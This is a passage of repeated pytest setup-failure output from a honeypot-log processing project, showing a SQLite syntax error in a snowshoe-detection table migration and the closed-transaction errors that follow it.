            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
____ ERROR at setup of TestFileEnrichmentFlow.test_duplicate_file_handling _____

test_db_path = 'sqlite:////tmp/pytest-of-speterson/pytest-33/test_duplicate_file_handling0/test.db'

    @pytest.fixture
    def engine(test_db_path):
        """Create database engine for testing."""
        engine = create_engine_from_settings(load_database_settings())
        # Override with test database path
        from sqlalchemy import create_engine
    
        engine = create_engine(test_db_path)
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_files_enrichment_flow.py:30: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26e2890>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:39:41,959:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:39:41,960:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:39:41,969:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:39:41,970:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:39:41,972:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:39:41,974:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:39:41,975:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:39:41,977:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:39:41,978:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:39:41,979:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:39:41,980:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:39:41,981:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:39:41,982:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:39:41,983:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:41,984:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:41,985:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:41,985:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:41,986:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:41,986:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:41,986:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
___ ERROR at setup of TestFileEnrichmentFlow.test_file_metadata_preservation ___

test_db_path = 'sqlite:////tmp/pytest-of-speterson/pytest-33/test_file_metadata_preservatio0/test.db'

    @pytest.fixture
    def engine(test_db_path):
        """Create database engine for testing."""
        engine = create_engine_from_settings(load_database_settings())
        # Override with test database path
        from sqlalchemy import create_engine
    
        engine = create_engine(test_db_path)
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_files_enrichment_flow.py:30: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26b0f30>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:39:45,046:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:39:45,047:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:39:45,053:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:39:45,055:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:39:45,056:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:39:45,057:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:39:45,059:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:39:45,060:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:39:45,061:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:39:45,062:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:39:45,063:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:39:45,064:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:39:45,068:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:39:45,069:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:45,069:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:45,070:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:45,070:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:45,071:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:45,071:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:45,071:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
__ ERROR at setup of TestFileEnrichmentFlow.test_invalid_file_events_handling __

test_db_path = 'sqlite:////tmp/pytest-of-speterson/pytest-33/test_invalid_file_events_handl0/test.db'

    @pytest.fixture
    def engine(test_db_path):
        """Create database engine for testing."""
        engine = create_engine_from_settings(load_database_settings())
        # Override with test database path
        from sqlalchemy import create_engine
    
        engine = create_engine(test_db_path)
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_files_enrichment_flow.py:30: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b323a6d0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:39:48,398:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:39:48,400:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:39:48,407:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:39:48,408:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:39:48,409:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:39:48,411:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:39:48,414:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:39:48,415:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:39:48,416:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:39:48,417:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:39:48,418:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:39:48,419:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:39:48,420:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:39:48,421:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:48,422:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:48,423:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:48,424:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:48,424:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:48,425:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:48,425:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
